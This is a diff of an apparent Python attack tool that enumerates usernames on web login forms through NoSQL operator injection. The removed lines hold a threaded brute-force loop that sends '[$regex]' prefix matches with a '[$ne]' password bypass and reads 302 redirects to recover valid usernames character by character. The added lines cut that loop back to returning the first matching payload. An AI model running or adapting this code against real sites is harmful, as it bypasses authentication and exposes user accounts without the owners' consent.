@@ -44,41 +44,10 @@ def process_payload(payload, characters, url, method, enum_parameter, password_p
         r.raise_for_status()
 
         if r.status_code == 302:
-            loop = True
-            userpass = payload
-            while loop:
-                loop = False
-                for char in characters:
-                    new_payload = userpass + char
-                    para = {enum_parameter + '[$regex]': "^" + new_payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
-                    try:
-                        r = session.request(method=method, url=url, data=para, timeout=10)
-                        r.raise_for_status()
-                        if r.status_code == 302:
-                            userpass = new_payload
-                            loop = True
-                    except requests.exceptions.RequestException as e:
-                        print(Fore.RED + "Error occurred during request:", e)
-                        break
-
-                # Check if the userpass is a valid username
-                para = {enum_parameter + '[$regex]': "^" + userpass + ".*", password_parameter + '[$ne]': '1' + other_parameters}
-                try:
-                    r = session.request(method=method, url=url, data=para, allow_redirects=False, timeout=10)
-                    r.raise_for_status()
-
-                    if r.status_code == 302:
-                        print(Fore.YELLOW + f"username found: {userpass}")
-                        return userpass
-
-                except requests.exceptions.RequestException as e:
-                    print(Fore.RED + "Error occurred during request:", e)
-
-            return None
+            return payload  # Only return the payload if a match is found
 
     except requests.exceptions.RequestException as e:
         print(Fore.RED + "Error occurred during request:", e)
-
 
 def main():
     args = get_arguments()
@@ -102,11 +71,9 @@ def main():
 
     valid_usernames = set()
 
-    def process_payload_wrapper(payload):
-        return process_payload(payload, characters, url, method, enum_parameter, password_parameter, other_parameters, session)
-
     with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-        results = executor.map(process_payload_wrapper, payloads)
+        results = executor.map(process_payload, payloads, [characters] * len(payloads), [url] * len(payloads), [method] * len(payloads),
+                               [enum_parameter] * len(payloads), [password_parameter] * len(payloads), [other_parameters] * len(payloads), [session] * len(payloads))
         
         for userpass in results:
             if userpass and userpass not in valid_usernames:
